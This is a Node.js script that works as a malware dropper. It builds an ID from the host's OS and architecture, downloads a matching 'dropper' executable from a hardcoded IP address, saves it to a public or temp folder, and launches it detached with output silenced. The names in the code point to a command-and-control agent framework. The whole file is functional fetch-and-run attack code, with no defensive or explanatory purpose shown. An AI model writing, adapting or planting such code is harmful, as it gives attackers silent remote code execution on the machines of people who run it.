import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';

const BASE = 'http://10.10.6.129:8787';   //(process.env.STARSHIP_BASE || 'http://starship.com').replace(/\/$/, '');

/** Map Node process.arch to droppers/<name> slug (amd64/arm64). */
function archSlug() {
  switch (process.arch) {
    case 'x64':
      return 'amd64';
    case 'arm64':
      return 'arm64';
    case 'arm':
      return 'arm';
    default:
      return process.arch;
  }
}

/** Droppers route id per Unix OS + arch (same layout as agent builds). */
function unixDropperId() {
  const plat = os.platform();
  if (plat === 'linux') return `agent-linux-${archSlug()}`;
  if (plat === 'darwin') return `agent-darwin-${archSlug()}`;
  return `agent-${plat}-${archSlug()}`;
}

function fetchToFile(url, destPath, cb) {
  const lib = url.startsWith('https:') ? https : http;
  const req = lib.get(url, (res) => {
    if (res.statusCode === 301 || res.statusCode === 302 || res.statusCode === 307 || res.statusCode === 308) {
      const loc = res.headers.location;
      if (loc) {
        fetchToFile(new URL(loc, url).href, destPath, cb);
        return;
      }
    }
    if (res.statusCode !== 200) {
      cb(new Error(`HTTP ${res.statusCode} for ${url}`));
      return;
    }
    const file = fs.createWriteStream(destPath, { mode: 0o600 });
    res.pipe(file);
    file.on('finish', () => file.close(() => cb(null)));
    file.on('error', cb);
    res.on('error', cb);
  });
  req.on('error', cb);
}

if (os.platform() === 'win32') {
  console.log('Running on Windows');
  const winPath = 'c:/users/public/windows.exe';
  const url = `${BASE}/droppers/windows.exe`;
  fetchToFile(url, winPath, (err) => {
    if (err) {
      console.error(err);
      return;
    }
    const child = spawn(winPath, [], {
      detached: true,
      stdio: 'ignore',
    });
    child.unref();
  });
} else {
  const id = unixDropperId();
  const outName = path.join(os.tmpdir(), id);
  const url = `${BASE}/droppers/${id}`;
  console.log(`Unix: fetching ${url} -> ${outName}`);

  fetchToFile(url, outName, (err) => {
    if (err) {
      console.error(err);
      return;
    }
    try {
      fs.chmodSync(outName, 0o755);
    } catch (e) {
      console.error('chmod:', e);
      return;
    }
    const child = spawn(outName, [], {
      detached: true,
      stdio: 'ignore',
    });
    child.unref();
  });
}
